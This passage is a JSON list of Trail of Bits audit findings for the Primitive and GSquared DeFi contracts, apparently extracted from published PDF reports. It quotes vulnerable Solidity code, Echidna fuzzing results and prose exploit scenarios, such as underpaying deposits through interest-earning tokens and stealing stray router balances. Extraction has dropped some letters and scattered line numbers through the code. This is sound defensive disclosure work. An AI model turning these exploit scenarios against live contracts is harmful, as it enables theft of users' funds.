transfer to the pool contract to pass the balance check (i.e., the check conrming that the balance has suciently increased). In eect, the users token payment obligation is reduced because the interest accounts for part of the required balance increase. To date, we have not identied a token contract that contains such a functionality; however, it is possible that one exists or could be created. Exploit Scenario Bob deploys a PrimitiveEngine contract with token1 and token2. Token1 allows its holders to earn passive interest. Anyone can call get_interest(address) to make a certain token holders interest be claimed and added to the token holders balance. Over time, the pool can claim 1,000 tokens. Eve calls deposit , and the pool requires Eve to send 1,000 tokens. Eve calls get_interest(address) in the depositCallback function instead of sending the tokens, depositing to the pool without paying the minimum required tokens. Recommendations Short term, add documentation explaining to users that the use of interest-earning tokens can reduce the standard payments for deposit , allocate , create , and swap . Long term, using the Token Integration Checklist (appendix C), generate a document detailing the shortcomings of tokens with certain features and the impacts of their use in the Primitive protocol. That way, users will not be alarmed if the use of a token with nonstandard features leads to unexpected results.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "The Primitive contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Primitive contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Lack of zero-value checks on functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. function deposit( address recipient, uint256 delRisky, uint256 delStable, bytes calldata data ) external override lock { if (delRisky == 0 && delStable == 0 ) revert ZeroDeltasError(); margins[recipient].deposit(delRisky, delStable); // state update uint256 balRisky; uint256 balStable; if (delRisky != 0 ) balRisky = balanceRisky(); if (delStable != 0 ) balStable = balanceStable(); IPrimitiveDepositCallback( msg.sender ).depositCallback(delRisky, delStable, data); // agnostic payment if (delRisky != 0 ) checkRiskyBalance(balRisky + delRisky); if (delStable != 0 ) checkStableBalance(balStable + delStable); emit Deposit( msg.sender , recipient, delRisky, delStable); } Figure 5.1: rmm-core/contracts/PrimitiveEngine.sol#L201-L219 Among others, the following functions lack zero-value checks on their arguments:  PrimitiveEngine.deposit  PrimitiveEngine.withdraw  PrimitiveEngine.allocate  PrimitiveEngine.swap  PositionDescriptor.constructor  MarginManager.deposit  MarginManager.withdraw  SwapManager.swap  CashManager.unwrap  CashManager.sweepToken Exploit Scenario Alice, a user, mistakenly provides the zero address as an argument when depositing for a recipient. As a result, her funds are saved in the margins of the zero address instead of a dierent address. Recommendations Short term, add zero-value checks for all function arguments to ensure that users cannot mistakenly set incorrect values, misconguring the system. Long term, use Slither, which will catch functions that do not have zero-value checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. uint256.percentage() and int256.percentage() are not inverses of each other ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "The Units library provides two percentage helper functions to convert unsigned integers to signed 64x64 xed-point values, and vice versa. Due to rounding errors, these functions are not direct inverses of each other. /// @notice Converts denormalized percentage integer to a fixed point 64.64 number /// @dev Convert unsigned 256-bit integer number into signed 64.64 fixed point number /// @param denorm Unsigned percentage integer with precision of 1e4 /// @return Signed 64.64 fixed point percentage with precision of 1e4 function percentage( uint256 denorm) internal pure returns ( int128 ) { return denorm. divu (PERCENTAGE); } /// @notice Converts signed 64.64 fixed point percentage to a denormalized percetage integer /// @param denorm Signed 64.64 fixed point percentage /// @return Unsigned percentage denormalized with precision of 1e4 function percentage( int128 denorm) internal pure returns ( uint256 ) { return denorm. mulu (PERCENTAGE); } Figure 6.1: rmm-core/contracts/libraries/Units.sol#L53-L66 These two functions use ABDKMath64x64.divu() and ABDKMath64x64.mulu() , which both round downward toward zero. As a result, if a uint256 value is converted to a signed 64x64 xed point and then converted back to a uint256 value, the result will not equal the original uint256 value: function scalePercentages (uint256 value ) public { require(value > Units.PERCENTAGE); int128 signedPercentage = value.percentage(); uint256 unsignedPercentage = signedPercentage.percentage(); if(unsignedPercentage != value) { emit AssertionFailed( \"scalePercentages\" , signedPercentage, unsignedPercentage); assert(false); } Figure 6.2: rmm-core/contracts/LibraryMathEchidna.sol#L48-L57 used Echidna to determine this property violation: Analyzing contract: /rmm-core/contracts/LibraryMathEchidna.sol:LibraryMathEchidna scalePercentages(uint256): failed! Call sequence: scalePercentages(10006) Event sequence: Panic(1), AssertionFailed(\"scalePercentages\", 18457812120153777346, 10005) Figure 6.3: Echidna results Exploit Scenario 1. uint256.percentage()  10006.percentage() = 1.0006 , which truncates down to 1. 2. int128.percentage()  1.percentage() = 10000 . 3. The assertion fails because 10006 != 10000 . Recommendations Short term, either remove the int128.percentage() function if it is unused in the system or ensure that the percentages round in the correct direction to minimize rounding errors. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Users can allocate tokens to a pool at the moment the pool reaches maturity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "Users can allocate tokens to a pool at the moment the pool reaches maturity, which creates an opportunity for attackers to front-run or update the curve right before the maturity period ends. function allocate ( bytes32 poolId , address recipient , uint256 delRisky , uint256 delStable , bool fromMargin , bytes calldata data ) external override lock returns ( uint256 delLiquidity ) { if (delRisky == 0 || delStable == 0 ) revert ZeroDeltasError(); Reserve.Data storage reserve = reserves[poolId]; if (reserve.blockTimestamp == 0 ) revert UninitializedError(); uint32 timestamp = _blockTimestamp(); if (timestamp > calibrations[poolId].maturity) revert PoolExpiredError(); uint256 liquidity0 = (delRisky * reserve.liquidity) / uint256 (reserve.reserveRisky); uint256 liquidity1 = (delStable * reserve.liquidity) / uint256 (reserve.reserveStable); delLiquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1; if (delLiquidity == 0 ) revert ZeroLiquidityError(); liquidity[recipient][poolId] += delLiquidity; // increase position liquidity reserve.allocate(delRisky, delStable, delLiquidity, timestamp); // increase reserves and liquidity if (fromMargin) { margins.withdraw(delRisky, delStable); // removes tokens from `msg.sender` margin account } else { ( uint256 balRisky , uint256 balStable ) = (balanceRisky(), balanceStable()); IPrimitiveLiquidityCallback( msg.sender ).allocateCallback(delRisky, delStable, data); // agnostic payment checkRiskyBalance(balRisky + delRisky); checkStableBalance(balStable + delStable); } emit Allocate( msg.sender , recipient, poolId, delRisky, delStable); } Figure 7.1: rmm-core/contracts/PrimitiveEngine.sol#L236-L268 Recommendations Short term, document the expected behavior of transactions to allocate funds into a pool that has just reached maturity and analyze the front-running risk. Long term, analyze all front-running risks on all transactions in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Possible front-running vulnerability during BUFFER time ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "The PrimitiveEngine.swap function permits swap transactions until 120 seconds after maturity, which could enable miners to front-run swap transactions and engage in malicious behavior. The constant tau value may allow miners to prot from front-running transactions when the swap curve is locked after maturity. SwapDetails memory details = SwapDetails({ recipient: recipient, poolId: poolId, deltaIn: deltaIn, deltaOut: deltaOut, riskyForStable: riskyForStable, fromMargin: fromMargin, toMargin: toMargin, timestamp: _blockTimestamp() }); uint32 lastTimestamp = _updateLastTimestamp(details.poolId); // updates lastTimestamp of `poolId` if (details.timestamp > lastTimestamp + BUFFER) revert PoolExpiredError(); // 120s buffer to allow final swaps Figure 8.1: rmm-core/contracts/PrimitiveEngine.sol#L314-L326 Recommendations Short term, perform an o-chain analysis on the curve and the swaps to determine the impact of a front-running attack on these transactions. Long term, perform an additional economic analysis with historical data on pools to determine the impact of front-running attacks on all functionality in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "9. Inconsistency in allocate and remove functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "The allocate and remove functions do not have the same interface, as one would expect. The allocate function allows users to set the recipient of the allocated liquidity and choose whether the funds will be taken from the margins or sent directly. The remove function unallocates the liquidity from the pool and sends the tokens to the msg.sender ; with this function, users cannot set the recipient of the tokens or choose whether the tokens will be credited to their margins for future use or directly sent back to them. function allocate ( bytes32 poolId , address recipient , uint256 delRisky , uint256 delStable , bool fromMargin , bytes calldata data ) external override lock returns ( uint256 delLiquidity ) { if (delRisky == 0 || delStable == 0 ) revert ZeroDeltasError(); Reserve.Data storage reserve = reserves[poolId]; if (reserve.blockTimestamp == 0 ) revert UninitializedError(); uint32 timestamp = _blockTimestamp(); if (timestamp > calibrations[poolId].maturity) revert PoolExpiredError(); uint256 liquidity0 = (delRisky * reserve.liquidity) / uint256 (reserve.reserveRisky); uint256 liquidity1 = (delStable * reserve.liquidity) / uint256 (reserve.reserveStable); delLiquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1; if (delLiquidity == 0 ) revert ZeroLiquidityError(); liquidity[recipient][poolId] += delLiquidity; // increase position liquidity reserve.allocate(delRisky, delStable, delLiquidity, timestamp); // increase reserves and liquidity if (fromMargin) { margins.withdraw(delRisky, delStable); // removes tokens from `msg.sender` margin account } else { ( uint256 balRisky , uint256 balStable ) = (balanceRisky(), balanceStable()); IPrimitiveLiquidityCallback( msg.sender ).allocateCallback(delRisky, delStable, data); // agnostic payment checkRiskyBalance(balRisky + delRisky); checkStableBalance(balStable + delStable); } emit Allocate( msg.sender , recipient, poolId, delRisky, delStable); } Figure 9.1: rmm-core/contracts/PrimitiveEngine.sol#L236-L268 Recommendations Short term, either document the design decision or add the logic to the remove function allowing users to set the recipient and to choose whether the tokens should be credited to their margins . Long term, make sure to document design decisions and the rationale behind them, especially for behavior that may not be obvious.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "10. Areas of the codebase that are inconsistent with the documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "The Primitive codebase contains clear documentation and mathematical analysis denoting the intended behavior of the system. However, we identied certain areas in which the implementation does not match the white paper, including the following:  Expected range for the gamma value of a pool. The white paper denes 10,000 as 100% in the smart contract; however, the contract checks that the provided gamma is between 9,000 (inclusive) and 10,000 (exclusive); if it is not within this range, the pool reverts with a GammaError . The white paper should be updated to reect the behavior of the code in these areas. Recommendations Short term, review and properly document all areas of the codebase with this gamma range check. Long term, ensure that the formal specication matches the expected behavior of the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "11. Allocate and remove are not exact inverses of each other ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "Due to the rounding logic used in the codebase, when users allocate funds into a system, they may not receive the same amount back when they remove them. When funds are allocated into a system, the values are rounded down (through native truncation) when they are added to the reserves: /// @notice Add to both reserves and total supply of liquidity /// @param reserve Reserve storage to manipulate /// @param delRisky Amount of risky tokens to add to the reserve /// @param delStable Amount of stable tokens to add to the reserve /// @param delLiquidity Amount of liquidity created with the provided tokens /// @param blockTimestamp Timestamp used to update cumulative reserves function allocate ( Data storage reserve, uint256 delRisky , uint256 delStable , uint256 delLiquidity , uint32 blockTimestamp ) internal { update(reserve, blockTimestamp); reserve.reserveRisky += delRisky.toUint128(); reserve.reserveStable += delStable.toUint128(); reserve.liquidity += delLiquidity.toUint128(); } Figure 11.1: rmm-core/contracts/libraries/Reserve.sol#L70-L87 When funds are removed from the reserves, they are similarly truncated: /// @notice Remove from both reserves and total supply of liquidity /// @param reserve Reserve storage to manipulate /// @param delRisky Amount of risky tokens to remove to the reserve /// @param delStable Amount of stable tokens to remove to the reserve /// @param delLiquidity Amount of liquidity removed from total supply /// @param blockTimestamp Timestamp used to update cumulative reserves function remove( Data storage reserve, uint256 delRisky, uint256 delStable, uint256 delLiquidity, uint32 blockTimestamp ) internal { update(reserve, blockTimestamp); reserve.reserveRisky -= delRisky.toUint128(); reserve.reserveStable -= delStable.toUint128(); reserve.liquidity -= delLiquidity.toUint128(); } Figure 11.2: rmm-core/contracts/libraries/Reserve.sol#L89-L106 We used the following Echidna property to test this behavior: function check_allocate_remove_inverses( uint256 randomId, uint256 intendedLiquidity, bool fromMargin ) public { AllocateCall memory allocate; allocate.poolId = Addresses.retrieve_created_pool(randomId); retrieve_current_pool_data(allocate.poolId, true ); intendedLiquidity = E2E_Helper.one_to_max_uint64(intendedLiquidity); allocate.delRisky = (intendedLiquidity * precall.reserve.reserveRisky) / precall.reserve.liquidity; allocate.delStable = (intendedLiquidity * precall.reserve.reserveStable) / precall.reserve.liquidity; uint256 delLiquidity = allocate_helper(allocate); // these are calculated the amount returned when remove is called ( uint256 removeRisky, uint256 removeStable) = remove_should_succeed(allocate.poolId, delLiquidity); emit AllocateRemoveDifference(allocate.delRisky, removeRisky); emit AllocateRemoveDifference(allocate.delStable, removeStable); assert (allocate.delRisky == removeRisky); assert (allocate.delStable == removeStable); assert (intendedLiquidity == delLiquidity); } Figure 11.3: rmm-core/contracts/libraries/Reserve.sol#L89-L106 In considering this rounding logic, we used Echidna to calculate the most optimal allocate value for an amount of liquidity, which resulted 1,920,041,647,503 as the dierence in the amount allocated and the amount removed. check_allocate_remove_inverses(uint256,uint256,bool): failed! Call sequence: create_new_pool_should_not_revert(113263940847354084267525170308314,0,12,58,414705177,292070 35433870938731770491094459037949100611312053389816037169023399245174) from: 0x0000000000000000000000000000000000020000 Gas: 0xbebc20 check_allocate_remove_inverses(513288669432172152578276403318402760987129411133329015270396, 675391606931488162786753316903883654910567233327356334685,false) from: 0x1E2F9E10D02a6b8F8f69fcBf515e75039D2EA30d Event sequence: Panic(1), Transfer(6361150874), Transfer(64302260917206574294870), AllocateMarginBalance(0, 0, 6361150874, 64302260917206574294870), Transfer(6361150874), Transfer(64302260917206574294870), Allocate(6361150874, 64302260917206574294870), Remove(6361150873, 64302260915286532647367), AllocateRemoveDifference(6361150874, 6361150873), AllocateRemoveDifference( 64302260917206574294870, 64302260915286532647367 ) Figure 11.4: Echidna results Exploit Scenario Alice, a Primitive user, determines a specic amount of liquidity that she wants to put into the system. She calculates the required risky and stable tokens to make the trade, and then allocates the funds to the pool. Due to the rounding direction in the allocate operation and the pool, she receives less than she expected after removing her liquidity. Recommendations Short term, perform additional analysis to determine a safe delta value to allow the allocate and remove operations to happen. Document this issue for end users to ensure that they are aware of the rounding behavior. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. scaleToX64() and scalefromX64() are not inverses of each other ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "The Units library provides the scaleToX64() and scalefromX64() helper functions to convert unsigned integers to signed 64x64 xed-point values, and vice versa. Due to rounding errors, these functions are not direct inverses of each other. /// @notice Converts unsigned 256-bit wei value into a fixed point 64.64 number /// @param value Unsigned 256-bit wei amount, in native precision /// @param factor Scaling factor for `value`, used to calculate decimals of `value` /// @return y Signed 64.64 fixed point number scaled from native precision function scaleToX64 ( uint256 value , uint256 factor ) internal pure returns ( int128 y ) { uint256 scaleFactor = PRECISION / factor; y = value.divu(scaleFactor); } Figure 12.1: rmm-core/contracts/libraries/Units.sol#L35-L42 These two functions use ABDKMath64x64.divu() and ABDKMath64x64.mulu() , which both round downward toward zero. As a result, if a uint256 value is converted to a signed 64x64 xed point and then converted back to a uint256 value, the result will not equal the original uint256 value: /// @notice Converts signed fixed point 64.64 number into unsigned 256-bit wei value /// @param value Signed fixed point 64.64 number to convert from precision of 10^18 /// @param factor Scaling factor for `value`, used to calculate decimals of `value` /// @return y Unsigned 256-bit wei amount scaled to native precision of 10^(18 - factor) function scalefromX64 ( int128 value , uint256 factor ) internal pure returns ( uint256 y ) { uint256 scaleFactor = PRECISION / factor; y = value.mulu(scaleFactor); } Figure 12.2: rmm-core/contracts/libraries/Units.sol#L44-L51 We used the following Echidna property to test this behavior: function scaleToAndFromX64Inverses (uint256 value , uint256 _decimals ) public { // will enforce factor between 0 - 12 uint256 factor = _decimals % ( 13 ); // will enforce scaledFactor between 1 - 10**12 , because 10**0 = 1 uint256 scaledFactor = 10 **factor; int128 scaledUpValue = value.scaleToX64(scaledFactor); uint256 scaledDownValue = scaledUpValue.scalefromX64(scaledFactor); assert(scaledDownValue == value); } Figure 12.3: contracts/crytic/LibraryMathEchidna.sol scaleToAndFromX64Inverses(uint256,uint256): failed! Call sequence: scaleToAndFromX64Inverses(1,0) Event sequence: Panic(1) Figure 12.4: Echidna results Recommendations Short term, ensure that the percentages round in the correct direction to minimize rounding errors. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. getCDF always returns output in the range of (0, 1) ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "CumulativeNormalDistribution provides the getCDF function to calculate an approximation of the cumulative distribution function, which should result in (0, 1] ; however, the getCDF function could return 1 . /// @notice Uses Abramowitz and Stegun approximation: /// https://en.wikipedia.org/wiki/Abramowitz_and_Stegun /// @dev Maximum error: 3.15x10-3 /// @return Standard Normal Cumulative Distribution Function of `x` function getCDF( int128 x) internal pure returns ( int128 ) { int128 z = x.div(CDF3); int128 t = ONE_INT.div(ONE_INT.add(CDF0.mul(z.abs()))); int128 erf = getErrorFunction(z, t); if (z < 0 ) { erf = erf.neg(); } int128 result = (HALF_INT).mul(ONE_INT.add(erf)); return result; } Figure 13.1: rmm-core/contracts/libraries/CumulativeNormalDistribution.sol#L24-L37 We used the following Echidna property to test this behavior. function CDFCheckRange( uint128 x, uint128 neg) public { int128 x_x = realisticCDFInput(x, neg); int128 res = x_x.getCDF(); emit P(x_x, res, res.toInt()); assert (res > 0 && res.toInt() < 1 ); } Figure 13.2: rmm-core/contracts/LibraryMathEchidna.sol CDFCheckRange(uint128,uint128): failed! Call sequence: CDFCheckRange(168951622815827493037,1486973755574663235619590266651) Event sequence: Panic(1), P(168951622815827493037, 18446744073709551616, 1) Figure 13.3: Echidna results Recommendations Short term, perform additional analysis to determine whether this behavior is an issue for the system. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Lack of data validation on withdrawal operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "description": "The withdraw function allows users to specify the recipient to send funds to. Due to a lack of data validation, the address of the engine could be set as the recipient. As a result, the tokens will be transferred directly to the engine itself. /// @inheritdoc IPrimitiveEngineActions function withdraw ( address recipient , uint256 delRisky , uint256 delStable ) external override lock { if (delRisky == 0 && delStable == 0 ) revert ZeroDeltasError(); margins.withdraw(delRisky, delStable); // state update if (delRisky != 0 ) IERC20(risky).safeTransfer(recipient, delRisky); if (delStable != 0 ) IERC20(stable).safeTransfer(recipient, delStable); emit Withdraw( msg.sender , recipient, delRisky, delStable); } Figure 14.1: rmm-core/contracts/PrimitiveEngine.sol#L221-L232 We used the following Echidna property to test this behavior. function withdraw_with_only_non_zero_addr( address recipient, uint256 delRisky, uint256 delStable ) public { require (recipient != address ( 0 )); //ensures that delRisky and delStable are at least 1 and not too large to overflow the deposit delRisky = E2E_Helper.one_to_max_uint64(delRisky); delStable = E2E_Helper.one_to_max_uint64(delStable); MarginHelper memory senderMargins = populate_margin_helper( address ( this )); if (senderMargins.marginRisky < delRisky || senderMargins.marginStable < delStable) { withdraw_should_revert(recipient, delRisky, delStable); } else { withdraw_should_succeed(recipient, delRisky, delStable); } } function withdraw_should_succeed ( address recipient , uint256 delRisky , uint256 delStable ) internal { MarginHelper memory precallSender = populate_margin_helper( address ( this )); MarginHelper memory precallRecipient = populate_margin_helper(recipient); uint256 balanceRecipientRiskyBefore = risky.balanceOf(recipient); uint256 balanceRecipientStableBefore = stable.balanceOf(recipient); uint256 balanceEngineRiskyBefore = risky.balanceOf( address (engine)); uint256 balanceEngineStableBefore = stable.balanceOf( address (engine)); ( bool success , ) = address (engine).call( abi.encodeWithSignature( \"withdraw(address,uint256,uint256)\" , recipient, delRisky, delStable) ); if (!success) { assert( false ); return ; } { assert_post_withdrawal(precallSender, precallRecipient, recipient, delRisky, delStable); //check token balances uint256 balanceRecipientRiskyAfter = risky.balanceOf(recipient); uint256 balanceRecipientStableAfter = stable.balanceOf(recipient); uint256 balanceEngineRiskyAfter = risky.balanceOf( address (engine)); uint256 balanceEngineStableAfter = stable.balanceOf( address (engine)); emit DepositWithdraw( \"balance recip risky\" , balanceRecipientRiskyBefore, balanceRecipientRiskyAfter, delRisky); emit DepositWithdraw( \"balance recip stable\" , balanceRecipientStableBefore, balanceRecipientStableAfter, delStable); emit DepositWithdraw( \"balance engine risky\" , balanceEngineRiskyBefore, balanceEngineRiskyAfter, delRisky); emit DepositWithdraw( \"balance engine stable\" , balanceEngineStableBefore, balanceEngineStableAfter, delStable); assert(balanceRecipientRiskyAfter == balanceRecipientRiskyBefore + delRisky); assert(balanceRecipientStableAfter == balanceRecipientStableBefore + delStable); assert(balanceEngineRiskyAfter == balanceEngineRiskyBefore - delRisky); assert(balanceEngineStableAfter == balanceEngineStableBefore - delStable); } } Figure 14.2: rmm-core/contracts/crytic/E2E_Deposit_Withdrawal.sol withdraw_with_safe_range(address,uint256,uint256): failed! Call sequence: deposit_with_safe_range(0xa329c0648769a73afac7f9381e08fb43dbea72,115792089237316195423570985 008687907853269984665640564039447584007913129639937,5964323976539599410180707317759394870432 1625682232592596462650205581096120955) from: 0x1E2F9E10D02a6b8F8f69fcBf515e75039D2EA30d withdraw_with_safe_range(0x48bacb9266a570d521063ef5dd96e61686dbe788,5248038478797710845,748) from: 0x6A4A62E5A7eD13c361b176A5F62C2eE620Ac0DF8 Event sequence: Panic(1), Transfer(5248038478797710846), Transfer(749), Withdraw(5248038478797710846, 749), DepositWithdraw(\"sender risky\", 8446744073709551632, 3198705594911840786, 5248038478797710846), DepositWithdraw(\"sender stable\", 15594018607531992466, 15594018607531991717, 749), DepositWithdraw(\"balance recip risky\", 8446744073709551632, 8446744073709551632, 5248038478797710846), DepositWithdraw(\"balance recip stable\", 15594018607531992466, 15594018607531992466, 749), DepositWithdraw(\"balance engine risky\", 8446744073709551632, 8446744073709551632, 5248038478797710846), DepositWithdraw(\"balance engine stable\", 15594018607531992466, 15594018607531992466, 749) Figure 14.3: Echidna results Exploit Scenario Alice, a user, withdraws her funds from the Primitive engine. She accidentally species the address of the recipient as the engine address, and her funds are left stuck in the contract. Recommendations Short term, add a check to ensure that users cannot withdraw to the engine address directly to ensure that users are protected from these mistakes. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Unbounded loop can cause denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "Under certain conditions, the withdrawal code will loop, permanently blocking users from getting their funds. The beforeWithdraw function runs before any withdrawal to ensure that the vault has sucient assets. If the vault reserves are insucient to cover the withdrawal, it loops over each strategy, incrementing the _ strategyId pointer value with each iteration, and withdrawing assets to cover the withdrawal amount. 643 644 645 646 { 647 function beforeWithdraw ( uint256 _assets , ERC20 _token) internal returns ( uint256 ) // If reserves dont cover the withdrawal, start withdrawing from strategies 648 649 650 651 652 653 654 655 656 657 658 659 660 661 662 if (_assets > _token.balanceOf( address ( this ))) { uint48 _strategyId = strategyQueue.head; while ( true ) { address _strategy = nodes[_strategyId].strategy; uint256 vaultBalance = _token.balanceOf( address ( this )); // break if we have withdrawn all we need if (_assets <= vaultBalance) break ; uint256 amountNeeded = _assets - vaultBalance; StrategyParams storage _strategyData = strategies[_strategy]; amountNeeded = Math.min(amountNeeded, _strategyData.totalDebt); // If nothing is needed or strategy has no assets, continue if (amountNeeded == 0 ) { continue ; } Figure 1.1: The beforeWithdraw function in GVault.sol#L643-662 However, during an iteration, if the vault raises enough assets that the amount needed by the vault becomes zero or that the current strategy no longer has assets, the loop would keep using the same strategyId until the transaction runs out of gas and fails, blocking the withdrawal. Exploit Scenario Alice tries to withdraw funds from the protocol. The contract may be in a state that sets the conditions for the internal loop to run indenitely, resulting in the waste of all sent gas, the failure of the transaction, and blocking all withdrawal requests. Recommendations Short term, add logic to i ncrement the _strategyId variable to point to the next strategy in the StrategyQueue before the continue statement. Long term, use unit tests and fuzzing tools like Echidna to test that the protocol works as expected, even for edge cases.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "The setOwner() function is used to change the owner of the PnLFixedRate contract. Transferring ownership in one function call is error-prone and could result in irrevocable mistakes. function setOwner ( address _owner ) external { if ( msg.sender != owner) revert PnLErrors.NotOwner(); address previous_owner = msg.sender ; owner = _owner; emit LogOwnershipTransferred(previous_owner, _owner); 56 57 58 59 60 61 62 } Figure 2.1: contracts/pnl/PnLFixedRate:56-62 This issue can also be found in the following locations:  contracts/pnl/PnL.sol:36-42  contracts/strategy/ConvexStrategy.sol:447-453  contracts/strategy/keeper/GStrategyGuard.sol:92-97  contracts/strategy/stop-loss/StopLossLogic.sol:73-78 Exploit Scenario The owner of the PnLFixedRate contract is a governance-controlled multisignature wallet. The community agrees to change the owner of the strategy, but the wrong address is mistakenly provided to its call to setOwner , permanently misconguring the system. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, review how critical operations are implemented across the codebase to make sure they are not error-prone.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Non-zero token balances in the GRouter can be stolen ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-GSquared-securityreview.pdf",
        "description": "A non-zero balance of 3CRV, DAI, USDC, or USDT in the router contract can be stolen by an attacker. The GRouter contract is the entrypoint for deposits into a tranche and withdrawals out of a tranche. A deposit involves depositing a given number of a supported stablecoin (USDC, DAI, or USDT); converting the deposit, through a series of operations, into G3CRV, the protocols ERC4626-compatible vault token; and depositing the G3CRV into a tranche. Similarly, for withdrawals, the user burns their G3CRV that was in the tranche and, after a series of operations, receives back some amount of a supported stablecoin (gure 3.1). ERC20( address (tranche.getTrancheToken(_tranche))).safeTransferFrom( ); // withdraw from tranche // index is zero for ETH mainnet as their is just one yield token // returns usd value of withdrawal ( uint256 vaultTokenBalance , ) = tranche.withdraw( function withdrawFromTrancheForCaller ( msg.sender , address ( this ), _amount uint256 _amount , uint256 _token_index , bool _tranche , uint256 _minAmount 421 422 423 424 425 426 ) internal returns ( uint256 amount ) { 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 _amount, 0 , _tranche, address ( this ) vaultTokenBalance, address ( this ), address ( this ) ); ); // withdraw underlying from GVault uint256 underlying = vaultToken.redeem( 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 } // remove liquidity from 3crv to get desired stable from curve threePool.remove_liquidity_one_coin( underlying, int128 ( uint128 (_token_index)), //value should always be 0,1,2 0 ); ERC20 stableToken = ERC20(routerOracle.getToken(_token_index)); amount = stableToken.balanceOf( address ( this )); if (amount < _minAmount) { revert Errors.LTMinAmountExpected(); } // send stable to user stableToken.safeTransfer( msg.sender , amount); emit LogWithdrawal( msg.sender , _amount, _token_index, _tranche, amount); Figure 3.1: The withdrawFromTrancheForCaller function in GRouter.sol#L421-468 However, notice that during withdrawals the amount of stableTokens that will be transferred back to the user is a function of the current stableToken balance of the contract (see the highlighted line in gure 3.1). In the expected case, the balance should be only the tokens received from the threePool.remove_liquidity_one_coin swap (see L450 in gure 3.1). However, a non-zero balance could also occur if a user airdrops some tokens or they transfer tokens by mistake instead of calling the expected deposit or withdraw functions. As long as the attacker has at least 1 wei of G3CRV to burn, they are capable of withdrawing the whole balance of stableToken from the contract, regardless of how much was received as part of the threePool swap. A similar situation can happen with deposits. A non-zero balance of G3CRV can be stolen as long as the attacker has at least 1 wei of either DAI, USDC, or USDT. Exploit Scenario Alice mistakenly sends a large amount of DAI to the GRouter contract instead of calling the deposit function. Eve notices that the GRouter contract has a non-zero balance of DAI and calls withdraw with a negligible balance of G3CRV. Eve is able to steal Alice's DAI at a very small cost. Recommendations Short term, consider using the dierence between the contracts pre- and post-balance of stableToken for withdrawals, and depositAmount for deposits, in order to ensure that only the 